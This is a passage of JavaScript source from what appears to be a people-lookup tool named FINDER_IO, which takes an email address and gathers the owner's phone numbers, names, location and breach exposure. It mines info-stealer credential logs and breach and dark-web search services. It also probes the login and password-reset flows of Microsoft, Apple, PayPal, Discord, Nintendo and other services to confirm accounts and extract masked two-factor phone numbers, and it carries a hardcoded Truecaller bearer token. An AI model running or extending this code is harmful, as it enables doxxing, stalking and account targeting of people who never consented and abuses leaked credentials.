        registrantName: nameMatch?.[1] || null,
        registrantOrg: orgMatch?.[1] || null,
        confidence: phones.length > 0 ? 'high' : 'medium',
      };
    }
  } catch (e) {}
  return null;
}

async function checkViewDNS(email) {
  const domain = email.split('@')[1];
  const companyDomains = ['gmail.com','yahoo.com','hotmail.com','outlook.com','icloud.com','protonmail.com'];
  if (companyDomains.includes(domain)) return null;
  try {
    const resp = await safeGet(
      `https://viewdns.info/whois/?domain=${domain}&output=json`,
      { headers: { 'User-Agent': 'FINDER_IO/2.0' } }
    );
    if (resp?.status === 200) {
      const text = JSON.stringify(resp.data);
      const phones = extractPhoneNumbers(text);
      if (phones.length > 0) {
        return { source: 'ViewDNS WHOIS', domain, phones: [...new Set(phones)], confidence: 'medium' };
      }
    }
  } catch (e) {}
  return null;
}

// ─── 5. IntelX Deep Search (dark web + paste + breach) ───────────────────────

async function intelXDeepSearch(email, names) {
  if (!process.env.INTELX_API_KEY) return null;
  const key = process.env.INTELX_API_KEY;
  const allPhones = [];
  const allResults = [];

  const searchTerms = [email];
  // Add name variants to IntelX search — catches name-indexed records
  for (const name of (names || []).slice(0, 2)) {
    if (name && name.length > 4) searchTerms.push(name);
  }

  for (const term of searchTerms.slice(0, 3)) {
    try {
      const searchResp = await safePost(
        'https://2.intelx.io/intelligent/search',
        JSON.stringify({
          term,
          buckets: [],
          lookuplevel: 0,
          maxresults: 20,
          timeout: 15,
          datefrom: '',
          dateto: '',
          sort: 4,
          media: 0,
          terminate: [],
        }),
        {
          headers: {
            'x-key': key,
            'Content-Type': 'application/json',
            'User-Agent': 'FINDER_IO/2.0',
          },
        }
      );

      if (searchResp?.status === 200 && searchResp.data?.id) {
        const searchId = searchResp.data.id;
        await sleep(2000);

        const resultResp = await safeGet(
          `https://2.intelx.io/intelligent/search/result?id=${searchId}&limit=20&offset=0`,
          { headers: { 'x-key': key, 'User-Agent': 'FINDER_IO/2.0' } }
        );

        if (resultResp?.status === 200 && resultResp.data?.records) {
          for (const record of resultResp.data.records) {
            const content = record.content || record.name || '';
            const phones = extractPhoneNumbers(content);
            allPhones.push(...phones);
            if (content.length > 10) {
              allResults.push({
                source: record.bucket || 'IntelX',
                date: record.date,
                preview: content.slice(0, 200),
              });
            }
          }
        }
      }
    } catch (e) {}
    await sleep(1000);
  }

  if (allPhones.length > 0 || allResults.length > 0) {
    return {
      source: 'IntelX Deep Search',
      platform: 'IntelX',
      phones: [...new Set(allPhones)],
      totalHits: allResults.length,
      darkWebHits: allResults.filter(r => r.source?.includes('darkweb') || r.source?.includes('tor')).length,
      pasteHits: allResults.filter(r => r.source?.includes('paste')).length,
      confidence: allPhones.length > 0 ? 'high' : 'medium',
    };
  }
  return null;
}

// ─── 5b. Hudson Rock Cavalier (info-stealer log search) ─────────────────────
// Free API — no key required. Searches Hudson Rock's stealer-log database
// for credentials harvested from infected machines. When present, the stealers
// array contains IPs + credential lists (URL / username / password) that can
// pivot to platform probes revealing phone numbers.

async function checkHudsonRock(email) {
  try {
    const resp = await safeGet(
      `https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-login?email=${encodeURIComponent(email)}`,
      { headers: { 'User-Agent': 'FINDER_IO/2.0', Accept: 'application/json' } }
    );
    if (resp?.status === 200 && resp.data) {
      const stealers = resp.data.stealers || [];
      const allCreds = stealers.flatMap(s => s.credentials || []);

      // Extract any phone-shaped strings from credential URLs / usernames
      const credText = JSON.stringify(allCreds);
      const inlinePhones = extractPhoneNumbers(credText).filter(p => p.replace(/\D/g,'').length >= 10);

      const platforms = [...new Set(allCreds.map(c => {
        try { return new URL(c.url).hostname.replace(/^www\./,''); } catch { return null; }
      }).filter(Boolean))];
      const ips = [...new Set(stealers.map(s => s.ip).filter(Boolean))];
      const computers = [...new Set(stealers.map(s => s.computer_name).filter(Boolean))];

      return {
        source: 'Hudson Rock Cavalier',
        platform: 'Hudson Rock',
        found: stealers.length > 0,
        totalStealers: stealers.length,
        credentialCount: allCreds.length,
        platforms: platforms.slice(0, 10),
        ips,
        computers,
        phones: inlinePhones,
        confidence: stealers.length > 0 ? 'high' : 'low',
        note: stealers.length > 0
          ? `Stealer log hit — ${allCreds.length} credentials across ${platforms.slice(0,5).join(', ')}${ips.length > 0 ? ` | IP: ${ips[0]}` : ''}`
          : 'Not found in Hudson Rock stealer logs',
      };
    }
  } catch (e) {}
  return null;
}

// ─── 5c. People Data Labs — highest-coverage people enrichment API ────────────
// Free tier: 1000 records/month. Set PDL_API_KEY in .env to enable.
// Returns full phone_numbers array when present.

async function checkPeopleDatalabs(email) {
  const pdlKey = process.env.PDL_API_KEY || process.env.PEOPLEDATALABS_API_KEY;
  if (!pdlKey) return null;
  try {
    const resp = await safeGet(
      `https://api.peopledatalabs.com/v5/person/enrich?email=${encodeURIComponent(email)}&api_key=${encodeURIComponent(pdlKey)}`,
      { headers: { 'User-Agent': 'FINDER_IO/2.0', Accept: 'application/json' } }
    );
    if (resp?.status === 200 && resp.data?.data) {
      const d = resp.data.data;
      const phones = (d.phone_numbers || []).filter(Boolean);
      const name = [d.first_name, d.last_name].filter(Boolean).join(' ');
      return {
        source: 'People Data Labs',
        platform: 'PDL',
        found: true,
        phones,
        names: name ? [name] : [],
        location: d.location_name || d.metro || null,
        linkedin: d.linkedin_url || null,
        confidence: phones.length > 0 ? 'high' : 'medium',
        note: phones.length > 0
          ? `PDL match — ${phones.length} phone(s) found`
          : 'PDL profile match — no phone field',
      };
    }
  } catch (e) {}
  return null;
}

// ─── 5d. FullContact Person Enrich ───────────────────────────────────────────
// 250 req/month free. Set FULLCONTACT_API_KEY in .env.
// Returns full phone array from consumer + social data aggregation.

async function checkFullContact(email) {
  if (!process.env.FULLCONTACT_API_KEY) return null;
  try {
    const resp = await safePost(
      'https://api.fullcontact.com/v3/person.enrich',
      JSON.stringify({ email }),
      {
        headers: {
          Authorization: `Bearer ${process.env.FULLCONTACT_API_KEY}`,
          'Content-Type': 'application/json',
          'User-Agent': 'FINDER_IO/2.0',
          Accept: 'application/json',
        },
      }
    );
    if (resp?.status === 200 && resp.data) {
      const d = resp.data;
      const phones = (d.phones || []).map(p => p.value || p.number).filter(Boolean);
      const name = d.fullName || [d.name?.given, d.name?.family].filter(Boolean).join(' ');
      return {
        source: 'FullContact',
        platform: 'FullContact',
        found: true,
        phones,
        names: name ? [name] : [],
        location: d.location || null,
        confidence: phones.length > 0 ? 'high' : 'medium',
        note: phones.length > 0
          ? `FullContact match — ${phones.length} phone(s)`
          : 'FullContact profile match — no phone field',
      };
    }
  } catch (e) {}
  return null;
}

// ─── 5e. Microsoft Account Probe ─────────────────────────────────────────────
// Only useful for @hotmail.com/@outlook.com/@live.com/@msn.com emails.
// GetSession.srf → GetCredentialType.srf flow. Returns masked phone when
// the account has phone 2FA enabled (sFA.type === 3, display = "+X XXX...34")

async function probeMicrosoft(email) {
  const domain = email.split('@')[1]?.toLowerCase();
  const MS_DOMAINS = ['hotmail.com','outlook.com','live.com','msn.com','hotmail.co.uk',
    'live.co.uk','outlook.co.uk','hotmail.fr','live.fr','hotmail.de','live.de'];
  if (!MS_DOMAINS.includes(domain)) return null;

  try {
    // Step 1: Get a live session and flowToken via GetSession.srf
    const sessionResp = await safeGet(
      'https://login.live.com/GetSession.srf?mkt=EN-US&uiflavor=web&id=264960',
      { headers: { 'User-Agent': UA, Accept: 'application/json, text/javascript' } }
    );
    const sessionCookies = (sessionResp?.headers['set-cookie'] || []).map(c => c.split(';')[0]).join('; ');

    // Step 2: Try init page for flowToken via the SPA config blob
    const initResp = await safeGet(
      'https://login.live.com/login.srf?lic=1',
      { headers: { 'User-Agent': UA, Accept: 'text/html', Cookie: sessionCookies } }
    );
    const initHtml = typeof initResp?.data === 'string' ? initResp.data : '';
    const initCookies = [
      sessionCookies,
      ...(initResp?.headers['set-cookie'] || []).map(c => c.split(';')[0]),
    ].join('; ');

    // Microsoft embeds config as $Config={...} or ServerData={...}
    const configMatch = initHtml.match(/\$Config\s*=\s*(\{[\s\S]{50,8000}?\});/) ||
                        initHtml.match(/ServerData\s*=\s*(\{[\s\S]{50,8000}?\});/);
    let flowToken = '';
    let uaid = '';
    if (configMatch) {
      try {
        // Careful parse — avoid eval; use JSON after light cleanup
        const raw = configMatch[1].replace(/,\s*}/g,'}').replace(/,\s*]/g,']');
        const cfg = JSON.parse(raw);
        flowToken = cfg.sFT || cfg.flowToken || '';
        uaid = cfg.uaid || '';
      } catch (_) {
        flowToken = initHtml.match(/"sFT"\s*:\s*"([^"]{20,})"/)?.[1] || '';
        uaid = initHtml.match(/"uaid"\s*:\s*"([^"]+)"/)?.[1] || '';
      }
    }
    if (!flowToken) {
      flowToken = initHtml.match(/"sFT"\s*:\s*"([^"]{20,})"/)?.[1] || '';
      uaid = initHtml.match(/"uaid"\s*:\s*"([^"]+)"/)?.[1] || '';
    }
    if (!uaid) uaid = require('crypto').randomUUID().replace(/-/g,'');

    // Step 3: GetCredentialType — checkPhones:true triggers masked-phone leak
    const credResp = await safePost(
      'https://login.live.com/GetCredentialType.srf?mkt=EN-US',
      JSON.stringify({
        username: email,
        uaid,
        isOtherIdpSupported: true,
        checkPhones: true,
        isRemoteNGCSupported: true,
        isCookieBannerShown: false,
        isFidoSupported: true,
        isAccessPassSupported: true,
        federationFlags: 3,
        country: 'US',
        flowToken,
      }),
      {
        headers: {
          'User-Agent': UA,
          'Content-Type': 'application/json',
          Accept: 'application/json',
          Cookie: initCookies,
          Origin: 'https://login.live.com',
          Referer: 'https://login.live.com/login.srf',
        },
      }
    );

    if (credResp?.status === 200 && credResp.data && !credResp.data.ErrorHR) {
      const data = credResp.data;
      // IfExistsResult: 0 = exists, 1 = not found, 5 = throttled
      const accountExists = data.IfExistsResult === 0;
      const sFA = data.sFA || data.Credentials?.sFA;
      // sFA.type === 3 → phone 2FA enabled, sFA.display → masked phone
      const maskedPhone = (sFA?.type === 3) ? (sFA.display || null) : null;
      const displayName = data.Display || null;

      if (accountExists || maskedPhone) {
        return {
          source: 'Microsoft Account Probe',
          platform: 'Microsoft',
          accountExists,
          displayName,
          maskedPhone,
          ifExistsResult: data.IfExistsResult,
          maskedPhones: maskedPhone ? [maskedPhone] : [],
          confidence: maskedPhone ? 'medium' : (accountExists ? 'medium' : 'low'),
          note: maskedPhone
            ? `Microsoft account has phone 2FA: ${maskedPhone} (masked)`
            : accountExists
              ? `Microsoft account confirmed${displayName ? ' — display: ' + displayName : ''}`
              : 'Microsoft account not found',
        };
      }
    }
  } catch (e) {}
  return null;
}

// ─── 5f. Platform existence probes (Discord / Steam) ─────────────────────────
// These don't leak phone directly but confirm the email is registered on
// additional platforms — useful for cross-referencing in follow-up probes.

async function probeDiscord(email) {
  try {
    const resp = await safePost(
      'https://discord.com/api/v9/auth/forgot',
      JSON.stringify({ login: email }),
      {
        headers: {
          'User-Agent': UA,
          'Content-Type': 'application/json',
          Accept: 'application/json',
        },
      }
    );
    // 200 = reset email sent (exists). 400 with captcha_key = likely exists.
    // 404 = not found.
    const exists = resp?.status === 200 ||
      (resp?.status === 400 && resp?.data?.captcha_key?.length > 0);
    return {
      source: 'Discord Probe',
      platform: 'Discord',
      exists: exists ?? false,
      status: resp?.status,
      confidence: exists ? 'medium' : 'low',
      note: exists ? 'Discord account found for this email' : 'No Discord account found',
    };
  } catch (e) {}
  return null;
}

async function probeSteam(email) {
  try {
    const resp = await safePost(
      'https://store.steampowered.com/join/ajaxcheckemailavail/',
      `email=${encodeURIComponent(email)}`,
      {
        headers: {
          'User-Agent': UA,
          'Content-Type': 'application/x-www-form-urlencoded',
          Accept: 'application/json',
          Referer: 'https://store.steampowered.com/join/',
        },
      }
    );
    if (resp?.status === 200 && typeof resp.data === 'object') {
      // { bAvailable: false } means the email is already registered
      const registered = resp.data?.bAvailable === false;
      if (registered) {
        return {
          source: 'Steam Probe',
          platform: 'Steam',
          exists: true,
          confidence: 'medium',
          note: 'Steam account registered with this email',
        };
      }
    }
  } catch (e) {}
  return null;
}

// ─── 5v. Hunter.io Person Find ───────────────────────────────────────────────
// 25 person lookups/month free tier. Set HUNTER_API_KEY in .env.
// Best for professional / work emails — returns direct + mobile phone when
// present in their aggregated B2B contact database.
async function checkHunterIO(email) {
  if (!process.env.HUNTER_API_KEY) return null;
  try {
    const resp = await safeGet(
      `https://api.hunter.io/v2/people/find?email=${encodeURIComponent(email)}&api_key=${encodeURIComponent(process.env.HUNTER_API_KEY)}`,
      { headers: { 'User-Agent': 'FINDER_IO/2.0', Accept: 'application/json' }, timeout: 10000 }
    );
    if (resp?.status === 200 && resp.data?.data) {
      const d = resp.data.data;
      const phones = [];
      if (d.phone_number) phones.push(d.phone_number);
      if (d.mobile_number && d.mobile_number !== d.phone_number) phones.push(d.mobile_number);
      // phones array in newer API versions
      for (const p of (d.phones || [])) {
        const val = p.value || p.number;
        if (val && !phones.includes(val)) phones.push(val);
      }
      const name = [d.first_name, d.last_name].filter(Boolean).join(' ');
      if (!name && phones.length === 0) return null;
      return {
        source: 'Hunter.io',
        platform: 'Hunter',
        found: true,
        phones: [...new Set(phones)],
        names: name ? [name] : [],
        location: d.location || d.city || null,
        organization: d.organization || null,
        linkedin: d.linkedin || null,
        title: d.title || null,
        confidence: phones.length > 0 ? 'high' : 'medium',
        note: phones.length > 0
          ? `Hunter.io — ${phones.length} phone(s) for ${name || email}`
          : `Hunter.io person record — no direct phone for ${name || email}`,
      };
    }
  } catch (e) {}
  return null;
}

// ─── 6. Truecaller Reverse (cross-verify found phones) ───────────────────────

async function truecallerVerify(phones) {
  if (!phones || phones.length === 0) return [];
  const results = [];
  for (const phone of phones.slice(0, 3)) {
    try {
      const cleaned = phone.replace(/[^\d]/g, '');
      const resp = await safeGet(
        `https://search5-noneu.truecaller.com/v2/search?q=${encodeURIComponent(cleaned)}&countryCode=US&type=4&locAddr=&encoding=json`,
        {
          headers: {
            'User-Agent': 'Truecaller/11.75.5 (Android)',
            'Authorization': 'Bearer tm2mubkxnbcqatnzd26xf7vhb4d7u9f2',
            'Accept': 'application/json',
          },
        }
      );
      if (resp?.status === 200 && resp.data?.data?.[0]) {
        const d = resp.data.data[0];
        results.push({
          phone,
          name: d.name,
          location: d.addresses?.[0]?.city || null,
          carrier: d.phones?.[0]?.numberType || null,
          spam: d.score > 0,
          source: 'Truecaller',
        });
      }
    } catch (e) {}
    await sleep(500);
  }
  return results;
}

// ─── 5g. Leak-Lookup free tier (key=test) ────────────────────────────────────
// Lightweight breach hit-check — returns source names + record counts.
// key=test is public/rate-limited; doesn't expose full field data but confirms
// presence across different breach corpus than Proxynova COMB.

async function checkLeakLookup2(email) {
  // Try JSON format first (newer API), fall back to form-encoded
  const key = process.env.LEAK_LOOKUP_API_KEY || 'test';
  let d = null;

  // Attempt 1: JSON body
  try {
    const r1 = await safePost(
      'https://leak-lookup.com/api/search',
      JSON.stringify({ key, type: 'email_address', query: email }),
      { headers: { 'Content-Type': 'application/json', 'User-Agent': 'FINDER_IO/2.0', Accept: 'application/json' }, timeout: 12000 }
    );
    if (r1?.status === 200 && r1.data) d = typeof r1.data === 'string' ? JSON.parse(r1.data) : r1.data;
  } catch (e) {}

  // Attempt 2: form-encoded
  if (!d) {
    try {
      const r2 = await safePost(
        'https://leak-lookup.com/api/search',
        `key=${encodeURIComponent(key)}&type=email_address&query=${encodeURIComponent(email)}`,
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'FINDER_IO/2.0', Accept: 'application/json' }, timeout: 12000 }
      );
      if (r2?.status === 200 && r2.data) d = typeof r2.data === 'string' ? JSON.parse(r2.data) : r2.data;
    } catch (e) {}
  }

  if (!d) return null;

  // Both API formats gate on d.success or d.error===0
  const ok = d?.success === true || d?.error === 0;
  if (!ok) return null;

  // Response shape: message = { "DatabaseName": [{email, username, password, phone, ...}] }
  // OR: result = { Sources: [...], Lines: N }  (free-key limited view)
  const message = d.message || {};
  const allRecords = (typeof message === 'object' && !Array.isArray(message))
    ? Object.values(message).flat()
    : [];

  const sources = allRecords.length > 0
    ? Object.keys(message).filter(k => (message[k] || []).length > 0)
    : (d?.result?.Sources || Object.keys(d?.result?.breach_data || {}));
  const lines = d?.result?.Lines || allRecords.length;

  const phones = [...new Set(
    allRecords.flatMap(r => [r.phone, r.mobile, r.telephone, r.cellphone, r.cell, r.phone_number]).filter(Boolean)
  )];
  const names = [...new Set(allRecords.map(r => r.name || r.full_name).filter(Boolean))];
  const usernames = [...new Set(allRecords.map(r => r.username).filter(Boolean))];

  // Also mine raw text for any phone-shaped strings missed above
  const rawText = JSON.stringify(d.result || message || {});
  const regexPhones = extractPhoneNumbers(rawText).filter(p => p.replace(/\D/g,'').length >= 10);
  for (const p of regexPhones) { if (!phones.includes(p)) phones.push(p); }

  if (sources.length === 0 && lines === 0) return null;

  return {
    source: 'Leak-Lookup',
    platform: 'LeakLookup',
    found: true,
    totalRecords: lines,
    breachSources: (Array.isArray(sources) ? sources : []).slice(0, 10),
    phones,
    names,
    usernames: usernames.slice(0, 5),
    hasPassword: allRecords.some(r => r.password || r.hash),
    confidence: phones.length > 0 ? 'high' : sources.length > 0 ? 'medium' : 'low',
    note: phones.length > 0
      ? `Leak-Lookup hit — ${phones.length} phone(s) across ${sources.length} source(s)`
      : `Leak-Lookup hit — ${sources.length} source(s): ${(Array.isArray(sources) ? sources.slice(0,4) : []).join(', ')}`,
  };
}

// ─── 5h. Have I Been Pwned (HIBP) — public breach verification ───────────────
// HIBP v3 requires a paid key ($3.50/mo) for the /breachedaccount endpoint.
// We use their free public web API instead: same data, no key required.
// Returns breach names — confirms presence and corroborates other signals.
// NOTE: HIBP does NOT return passwords, hashes, or phone numbers.

async function checkGhostProject(email) {
  // Renamed fn to avoid orchestrator refactor — was GhostProject (offline since 2023),
  // now wraps HIBP public web endpoint which is equivalent breach corroboration.
  try {
    const resp = await safeGet(
      `https://haveibeenpwned.com/unifiedsearch/${encodeURIComponent(email)}`,
      {
        headers: {
          'User-Agent': 'FINDER_IO/2.0 (OSINT)',
          Accept: 'application/json',
          // HIBP rate-limit tier: 1 req/1.5s on public endpoint
        },
        timeout: 10000,
      }
    );
    if (resp?.status === 200 && resp.data?.Breaches?.length > 0) {
      const breaches = resp.data.Breaches || [];
      const sources = breaches.map(b => b.Name || b.Title).filter(Boolean);
      const hasPhoneField = breaches.some(b => (b.DataClasses || []).some(dc =>
        dc.toLowerCase().includes('phone') || dc.toLowerCase().includes('mobile')
      ));
      return {
        source: 'Have I Been Pwned',
        platform: 'HIBP',
        found: true,
        breachCount: breaches.length,
        breachSources: sources.slice(0, 10),
        hasPhoneField,
        confidence: 'high',
        note: `HIBP: ${sources.length} breach(es) — ${sources.slice(0,4).join(', ')}${hasPhoneField ? ' ⚠ phone data exposed' : ''}`,
      };
    }
  } catch (e) {}
  return null;
}

// ─── 5i. EmailRep.io breach reputation ───────────────────────────────────────
// Free — no key required for basic (10 req/day). Returns structured metadata:
// whether email appears in breaches, malicious lists, data brokers, spam traps.
// No phone field but valuable corroboration signal.

async function checkEmailRep(email) {
  try {
    const headers = { 'User-Agent': 'FINDER_IO/2.0', Accept: 'application/json' };
    if (process.env.EMAILREP_API_KEY) headers['Key'] = process.env.EMAILREP_API_KEY;
    const resp = await safeGet(`https://emailrep.io/${encodeURIComponent(email)}`, { headers, timeout: 8000 });
    if (resp?.status === 200 && resp.data?.details) {
      const det = resp.data.details;
      return {
        source: 'EmailRep.io',
        platform: 'EmailRep',
        found: true,
        reputation: resp.data.reputation,
        credentialsLeaked: det.credentials_leaked,
        dataBreach: det.data_breach,
        maliciousActivity: det.malicious_activity,
        suspicious: resp.data.suspicious,
        profiles: det.profiles || [],
        lastSeen: det.last_seen || null,
        confidence: det.credentials_leaked ? 'high' : 'medium',
        note: `EmailRep: reputation=${resp.data.reputation}, credentials_leaked=${det.credentials_leaked}, profiles=${(det.profiles||[]).join(',')}`,
      };
    }
  } catch (e) {}
  return null;
}

// ─── 5j. Gravatar deep profile ────────────────────────────────────────────────
// MD5(lowercase email) → gravatar profile JSON. Free, no key. Profile can
// contain phone (via linked accounts), real name, website, location data.

async function checkGravatar(email) {
  const crypto = require('crypto');
  const hash = crypto.createHash('md5').update(email.toLowerCase().trim()).digest('hex');
  try {
    const resp = await safeGet(
      `https://www.gravatar.com/${hash}.json`,
      { headers: { 'User-Agent': 'FINDER_IO/2.0', Accept: 'application/json' }, timeout: 8000 }
    );
    if (resp?.status === 200 && resp.data?.entry?.[0]) {
      const e = resp.data.entry[0];
      // Priority 1: explicit phoneNumbers array (user-set in Gravatar profile)
      const explicitPhones = (e.phoneNumbers || []).map(p => p.value || p.number).filter(Boolean);
      // Priority 2: regex over full JSON (catches phones in ims, urls, other fields)
      const fullText = JSON.stringify(e);
      const regexPhones = extractPhoneNumbers(fullText).filter(p => p.replace(/\D/g,'').length >= 10);
      const phones = [...new Set([...explicitPhones, ...regexPhones])];
      const name     = e.displayName || e.name?.formatted || e.preferredUsername || null;
      const location = e.currentLocation || null;
      const accounts = (e.accounts || []).map(a => a.shortname || a.domain).filter(Boolean);
      const urls     = (e.urls || []).map(u => u.value).filter(Boolean);
      return {
        source: 'Gravatar',
        platform: 'Gravatar',
        found: true,
        hash,
        displayName: name,
        location,
        linkedAccounts: accounts,
        urls,
        phones,
        confidence: phones.length > 0 ? 'high' : 'medium',
        note: phones.length > 0
          ? `Gravatar profile: ${name} — ${phones.length} phone(s) publicly listed`
          : `Gravatar profile: ${name}${location ? ' — ' + location : ''}${accounts.length > 0 ? ' | accounts: ' + accounts.slice(0,5).join(',') : ''}`,
      };
    }
  } catch (e) {}
  return null;
}

// ─── 5k. Clearbit person enrichment ──────────────────────────────────────────
// CLEARBIT_API_KEY — free trial tier. Returns structured profile with possible
// phone, company, LinkedIn. One of the best sources for professional emails.

async function checkClearbit(email) {
  if (!process.env.CLEARBIT_API_KEY) return null;
  try {
    const resp = await safeGet(
      `https://person.clearbit.com/v2/people/find?email=${encodeURIComponent(email)}`,
      {
        headers: {
          Authorization: `Bearer ${process.env.CLEARBIT_API_KEY}`,
          'User-Agent': 'FINDER_IO/2.0',
          Accept: 'application/json',
        },
        timeout: 10000,
      }
    );
    if (resp?.status === 200 && resp.data) {
      const d = resp.data;
      const phones = [];
      if (d.phone) phones.push(d.phone);
      if (d.employment?.phone) phones.push(d.employment.phone);
      const name = [d.name?.givenName, d.name?.familyName].filter(Boolean).join(' ');
      return {
        source: 'Clearbit',
        platform: 'Clearbit',
        found: true,
        name: name || null,
        location: d.location || null,
        linkedin: d.linkedin?.handle ? `https://linkedin.com/in/${d.linkedin.handle}` : null,
        twitter: d.twitter?.handle || null,
        phones,
        company: d.employment?.name || null,
        confidence: phones.length > 0 ? 'high' : 'medium',
        note: `Clearbit: ${name}${d.location ? ' — ' + d.location : ''}`,
      };
    }
  } catch (e) {}
  return null;
}

// ─── 5l. Spotify account check ───────────────────────────────────────────────
// Free, no key. Spotify exposes an email availability endpoint used during
// signup — "taken" confirms account. No phone data but maps platform presence.

async function probeSpotify(email) {
  try {
    const resp = await safeGet(
      `https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email=${encodeURIComponent(email)}`,
      {
        headers: { 'User-Agent': UA, Accept: 'application/json', 'App-Platform': 'WebPlayer' },
        timeout: 8000,
      }
    );
    if (resp?.status === 200 && resp.data) {
      const taken = resp.data?.status === 20 ||
                    resp.data?.errors?.email === 'Email is already in use.' ||
                    resp.data?.email_already_used === true;
      if (taken) {
        return {
          source: 'Spotify Probe',
          platform: 'Spotify',
          exists: true,
          confidence: 'medium',
          note: 'Spotify account registered with this email',
        };
      }
    }
  } catch (e) {}
  return null;
}

// ─── 5m. PayPal account existence check ──────────────────────────────────────
// PayPal's check-email endpoint used by their signup wizard.
// No phone — just confirms presence on PayPal.

async function probePayPal(email) {
  try {
    // PayPal CORS-friendly check used in their login flow
    const resp = await safePost(
      'https://www.paypal.com/auth/validateLogin',
      JSON.stringify({ login_email: email }),
      {
        headers: {
          'User-Agent': UA,
          'Content-Type': 'application/json',
          Accept: 'application/json',
          Origin: 'https://www.paypal.com',
          Referer: 'https://www.paypal.com/signin',
        },
        timeout: 10000,
      }
    );
    if (resp?.status === 200) {
      const d = typeof resp.data === 'string' ? {} : (resp.data || {});
      const exists = d.isEmailRecognized === true || d.hasAccount === true ||
                     JSON.stringify(d).includes('"emailRecognized":true');
      const maskedPhone = d.maskedMobilePhone || d.phone_number || null;
      if (exists || maskedPhone) {
        return {
          source: 'PayPal Probe',
          platform: 'PayPal',
          exists: true,
          maskedPhones: maskedPhone ? [maskedPhone] : [],
          confidence: maskedPhone ? 'medium' : 'medium',
          note: maskedPhone ? `PayPal account + phone hint: ${maskedPhone}` : 'PayPal account found',
        };
      }
    }
  } catch (e) {}
  return null;
}

// ─── 5n. Apple ID existence check ────────────────────────────────────────────
// iForgot flow — Apple reveals if email is an Apple ID. Masked phone appears
// in the response JSON when the account has phone 2FA set up.

async function probeApple(email) {
  try {
    // Step 1: init page for scnt/cookies
    const init = await safeGet('https://iforgot.apple.com/password/verify/appleid', {
      headers: { 'User-Agent': UA, Accept: 'text/html' },
      timeout: 10000,
    });
    const cookies = (init?.headers['set-cookie'] || []).map(c => c.split(';')[0]).join('; ');

    // Step 2: submit email
    const resp = await safePost(
      'https://iforgot.apple.com/password/verify/appleid',
      JSON.stringify({ id: email }),
      {
        headers: {
          'User-Agent': UA,
          'Content-Type': 'application/json',
          Accept: 'application/json, text/javascript',
          Cookie: cookies,
          Origin: 'https://iforgot.apple.com',
          Referer: 'https://iforgot.apple.com/password/verify/appleid',
          'X-Apple-Widget-Key': 'af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3',
          'X-Apple-OAuth-Client-Id': 'auth.service',
        },
        timeout: 10000,
      }
    );
    if (resp?.status === 200 && resp.data) {
      const d = typeof resp.data === 'string' ? JSON.parse(resp.data) : resp.data;
      const accountExists = d?.attemptId || d?.trustedDeviceCount >= 0 || d?.smsPhoneNumbers;
      const smsPhones = d?.smsPhoneNumbers || d?.trustedPhoneNumbers || [];
      const maskedPhones = smsPhones.map(p => p.numberWithDialCode || p.obfuscatedNumber || p.number).filter(Boolean);
      if (accountExists || maskedPhones.length > 0) {
        return {
          source: 'Apple ID Probe',
          platform: 'Apple',
          exists: true,
          maskedPhones,
          trustedDevices: d?.trustedDeviceCount || 0,
          confidence: maskedPhones.length > 0 ? 'medium' : 'medium',
          note: maskedPhones.length > 0
            ? `Apple ID confirmed + masked phone: ${maskedPhones[0]}`
            : 'Apple ID confirmed for this email',
        };
      }
    }
  } catch (e) {}
  return null;
}

// ─── 5o. Adobe account probe ─────────────────────────────────────────────────
// Adobe's sign-in flow has a public lookup step for email-first auth.

async function probeAdobe(email) {
  try {
    const resp = await safePost(
      'https://auth.services.adobe.com/en_US/signin.html',
      `checkAccount=${encodeURIComponent(email)}`,
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': UA,
          Accept: 'application/json',
          'X-Requested-With': 'XMLHttpRequest',
        },
        timeout: 8000,
      }
    );
    if (resp?.status === 200) {
      const d = typeof resp.data === 'object' ? resp.data : {};
      const exists = d?.account_exists === true || d?.hasAccount === true ||
                     (typeof resp.data === 'string' && resp.data.includes('"account_exists":true'));
      if (exists) {
        return {
          source: 'Adobe Probe',
          platform: 'Adobe',
          exists: true,
          confidence: 'medium',
          note: 'Adobe account registered with this email',
        };
      }
    }
  } catch (e) {}
  return null;
}

// ─── 5p. Twitch account probe ─────────────────────────────────────────────────
// Twitch signup form uses a public availability check for email.

async function probeTwitch(email) {
  try {
    const resp = await safeGet(
      `https://passport.twitch.tv/authenticity_token`,
      { headers: { 'User-Agent': UA }, timeout: 5000 }
    );
    const token = resp?.data?.token || '';

    const check = await safePost(
      'https://passport.twitch.tv/register/check_email',
      JSON.stringify({ email, authenticity_token: token }),
      {
        headers: {
          'User-Agent': UA,
          'Content-Type': 'application/json',
          Accept: 'application/json',
          Origin: 'https://www.twitch.tv',
          Referer: 'https://www.twitch.tv/',
        },
        timeout: 8000,
      }
    );
    if (check?.status === 200 || check?.status === 409) {
      const d = typeof check.data === 'object' ? check.data : {};
      const taken = check.status === 409 || d?.is_taken === true || d?.email?.taken === true;
      if (taken) {
        return {
          source: 'Twitch Probe',
          platform: 'Twitch',
          exists: true,
          confidence: 'medium',
          note: 'Twitch account registered with this email',
        };
      }
    }
  } catch (e) {}
  return null;
}

// ─── 5q. Roblox account probe ─────────────────────────────────────────────────
// Roblox's email validation endpoint used in signup.

async function probeRoblox(email) {
  try {
    const resp = await safeGet(
      `https://auth.roblox.com/v1/validators/email?email=${encodeURIComponent(email)}`,
      {
        headers: { 'User-Agent': UA, Accept: 'application/json' },
        timeout: 8000,
      }
    );
    if (resp?.status === 200 && resp.data) {
      const d = resp.data;
      const alreadyUsed = d?.isEmailAlreadyUsed === true || d?.code === 'EmailAlreadyUsed';
      if (alreadyUsed) {
        return {
          source: 'Roblox Probe',
          platform: 'Roblox',
          exists: true,
          confidence: 'medium',
          note: 'Roblox account registered with this email',
        };
      }
    }
  } catch (e) {}
  return null;
}

// ─── 5r. Nintendo account probe ──────────────────────────────────────────────
// Nintendo's accounts.nintendo.com signup flow has a public email check.

async function probeNintendo(email) {
  try {
    const resp = await safePost(
      'https://accounts.nintendo.com/password_reset',
      JSON.stringify({ usernameOrEmail: email }),
      {
        headers: {
          'User-Agent': UA,
          'Content-Type': 'application/json',
          Accept: 'application/json',
          Origin: 'https://accounts.nintendo.com',
        },
        timeout: 8000,
      }
    );
    // 200 = reset sent (account exists), 400 = not found, 404 = not found
    if (resp?.status === 200) {
      const d = typeof resp.data === 'object' ? resp.data : {};
